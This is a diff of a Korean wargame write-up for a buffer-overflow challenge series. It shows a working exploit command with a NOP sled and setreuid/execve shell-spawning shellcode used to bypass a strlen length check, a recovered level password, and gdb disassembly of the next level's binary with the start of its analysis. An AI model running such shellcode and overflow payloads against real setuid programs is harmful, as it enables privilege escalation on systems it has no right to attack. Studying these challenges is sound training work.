@@ -451,7 +451,8 @@ argv[1]의 길이를 확인하는 명령어가 추가되었다.
 정확히 ret을 덮을 만큼의 길이만 허용하고있다.  
 그래서 이를 해결하기 위해 strlen은 문자열의 끝을 알려주는 공백문자는 길이에 포함시키지 않는 것을 이용한다.
 
-즉, 아래와 같이 코드를 짜면 해결 할 수 있다.
+즉, 그동안 인자를 1개만 주었던것과는 달리 이번에는 2개를 주는 방법으로 해결하였다.  
+인자를 구분하기 위해 공백이 생기며 strlen은 첫번째 인자의 개수만 세고있을것이다.
 ```
 lv5@ubuntu:~$ ./lv6 `perl -e 'print "a"x44, "\xd0\xd3\xff\xff"'` `perl -e 'print "\x90"x200, "\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"'`
 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa����
@@ -465,6 +466,114 @@ $
 ```
 알아낸 lv6 비번 : still easy
 ## lv 6
+gdb로 lv7가 무슨 프로그램인지 확인해보자.
+```
+   0x08048500 <+0>:	push   ebp
+   0x08048501 <+1>:	mov    ebp,esp
+   0x08048503 <+3>:	sub    esp,0x2c
+   0x08048506 <+6>:	cmp    DWORD PTR [ebp+0x8],0x1
+   0x0804850a <+10>:	jg     0x8048523 <main+35>
+   0x0804850c <+12>:	push   0x8048690
+   0x08048511 <+17>:	call   0x8048410 <printf@plt>
+   0x08048516 <+22>:	add    esp,0x4
+   0x08048519 <+25>:	push   0x0
+   0x0804851b <+27>:	call   0x8048420 <exit@plt>
+   0x08048520 <+32>:	add    esp,0x4
+   0x08048523 <+35>:	mov    eax,DWORD PTR [ebp+0xc]
+   0x08048526 <+38>:	mov    edx,DWORD PTR [eax]
+   0x08048528 <+40>:	push   edx
+   0x08048529 <+41>:	call   0x80483f0 <strlen@plt>
+   0x0804852e <+46>:	add    esp,0x4
+   0x08048531 <+49>:	mov    eax,eax
+   0x08048533 <+51>:	cmp    eax,0x4d
+   0x08048536 <+54>:	je     0x8048550 <main+80>
+   0x08048538 <+56>:	push   0x804869c
+   0x0804853d <+61>:	call   0x8048410 <printf@plt>
+   0x08048542 <+66>:	add    esp,0x4
+   0x08048545 <+69>:	push   0x0
+   0x08048547 <+71>:	call   0x8048420 <exit@plt>
+   0x0804854c <+76>:	add    esp,0x4
+   0x0804854f <+79>:	nop
+   0x08048550 <+80>:	nop
+   0x08048551 <+81>:	mov    DWORD PTR [ebp-0x2c],0x0
+   0x08048558 <+88>:	mov    eax,DWORD PTR [ebp-0x2c]
+   0x0804855b <+91>:	lea    edx,[eax*4+0x0]
+   0x08048562 <+98>:	mov    eax,ds:0x80497d4
+   0x08048567 <+103>:	cmp    DWORD PTR [eax+edx*1],0x0
+   0x0804856b <+107>:	jne    0x8048570 <main+112>
+   0x0804856d <+109>:	jmp    0x80485b0 <main+176>
+   0x0804856f <+111>:	nop
+   0x08048570 <+112>:	mov    eax,DWORD PTR [ebp-0x2c]
+   0x08048573 <+115>:	lea    edx,[eax*4+0x0]
+   0x0804857a <+122>:	mov    eax,ds:0x80497d4
+   0x0804857f <+127>:	mov    edx,DWORD PTR [eax+edx*1]
+   0x08048582 <+130>:	push   edx
+   0x08048583 <+131>:	call   0x80483f0 <strlen@plt>
+   0x08048588 <+136>:	add    esp,0x4
+   0x0804858b <+139>:	mov    eax,eax
+   0x0804858d <+141>:	push   eax
+   0x0804858e <+142>:	push   0x0
+   0x08048590 <+144>:	mov    eax,DWORD PTR [ebp-0x2c]
+   0x08048593 <+147>:	lea    edx,[eax*4+0x0]
+   0x0804859a <+154>:	mov    eax,ds:0x80497d4
+   0x0804859f <+159>:	mov    edx,DWORD PTR [eax+edx*1]
+   0x080485a2 <+162>:	push   edx
+   0x080485a3 <+163>:	call   0x8048430 <memset@plt>
+   0x080485a8 <+168>:	add    esp,0xc
+   0x080485ab <+171>:	inc    DWORD PTR [ebp-0x2c]
+   0x080485ae <+174>:	jmp    0x8048558 <main+88>
+   0x080485b0 <+176>:	mov    eax,DWORD PTR [ebp+0xc]
+   0x080485b3 <+179>:	add    eax,0x4
+   0x080485b6 <+182>:	mov    edx,DWORD PTR [eax]
+   0x080485b8 <+184>:	add    edx,0x2f
+   0x080485bb <+187>:	cmp    BYTE PTR [edx],0xff
+   0x080485be <+190>:	je     0x80485d7 <main+215>
+   0x080485c0 <+192>:	push   0x80486ab
+   0x080485c5 <+197>:	call   0x8048410 <printf@plt>
+   0x080485ca <+202>:	add    esp,0x4
+   0x080485cd <+205>:	push   0x0
+   0x080485cf <+207>:	call   0x8048420 <exit@plt>
+   0x080485d4 <+212>:	add    esp,0x4
+   0x080485d7 <+215>:	mov    eax,DWORD PTR [ebp+0xc]
+   0x080485da <+218>:	add    eax,0x4
+   0x080485dd <+221>:	mov    edx,DWORD PTR [eax]
+   0x080485df <+223>:	push   edx
+   0x080485e0 <+224>:	call   0x80483f0 <strlen@plt>
+   0x080485e5 <+229>:	add    esp,0x4
+   0x080485e8 <+232>:	mov    eax,eax
+   0x080485ea <+234>:	cmp    eax,0x30
+   0x080485ed <+237>:	jbe    0x8048606 <main+262>
+   0x080485ef <+239>:	push   0x80486c8
+   0x080485f4 <+244>:	call   0x8048410 <printf@plt>
+   0x080485f9 <+249>:	add    esp,0x4
+   0x080485fc <+252>:	push   0x0
+   0x080485fe <+254>:	call   0x8048420 <exit@plt>
+   0x08048603 <+259>:	add    esp,0x4
+   0x08048606 <+262>:	mov    eax,DWORD PTR [ebp+0xc]
+   0x08048609 <+265>:	add    eax,0x4
+   0x0804860c <+268>:	mov    edx,DWORD PTR [eax]
+   0x0804860e <+270>:	push   edx
+   0x0804860f <+271>:	lea    eax,[ebp-0x28]
+   0x08048612 <+274>:	push   eax
+   0x08048613 <+275>:	call   0x8048440 <strcpy@plt>
+   0x08048618 <+280>:	add    esp,0x8
+   0x0804861b <+283>:	lea    eax,[ebp-0x28]
+   0x0804861e <+286>:	push   eax
+   0x0804861f <+287>:	push   0x80486df
+   0x08048624 <+292>:	call   0x8048410 <printf@plt>
+   0x08048629 <+297>:	add    esp,0x8
+   0x0804862c <+300>:	push   0x28
+   0x0804862e <+302>:	push   0x0
+   0x08048630 <+304>:	lea    eax,[ebp-0x28]
+   0x08048633 <+307>:	push   eax
+   0x08048634 <+308>:	call   0x8048430 <memset@plt>
+   0x08048639 <+313>:	add    esp,0xc
+   0x0804863c <+316>:	leave  
+   0x0804863d <+317>:	ret  
+```
+이번에는 초반에 ```argv[0]```을 검사한다.  
+만약 ```./lv7 aaa```를 입력하여 lv7을 실행했다고 가정해보자.   
+이때 ``argv[0]`` 은 `./lv7`이되며 `argv[1]`은 `aaa`가 된다.
 ## lv 7
 ## lv 8
 ## lv 9
